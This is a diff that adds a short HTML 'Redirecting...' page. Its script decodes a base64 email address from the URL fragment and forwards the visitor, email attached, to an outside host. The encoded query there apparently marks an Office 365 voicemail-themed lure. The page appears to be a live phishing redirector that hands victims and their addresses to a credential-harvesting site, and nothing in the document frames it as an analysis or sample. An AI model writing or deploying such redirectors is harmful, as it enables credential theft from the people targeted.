@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    function tryDecodeBase64(str) {
+      try {
+        const decoded = atob(str);
+        // Basic email pattern test to confirm it's a valid decode
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+          return decoded;
+        }
+        return str;
+      } catch (e) {
+        return str;
+      }
+    }
+
+    window.onload = function () {
+      const hash = window.location.hash.substring(1).trim();
+      const baseUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX3ZvaWNlJnJhbmQ9Sll6T3omdWlkPVVTRVIyOTA0MjAyNVUzODA0Mjk0MyZyYW5kPWM5NGdQN0123N";
+
+      if (hash) {
+        const email = tryDecodeBase64(decodeURIComponent(hash));
+        const redirectTo = `${baseUrl}#${encodeURIComponent(email)}`;
+        window.location.href = redirectTo;
+      } else {
+        window.location.href = baseUrl;
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting... If it doesn't happen automatically, <a href="#" id="manualLink">click here</a>.</p>
+</body>
+</html>
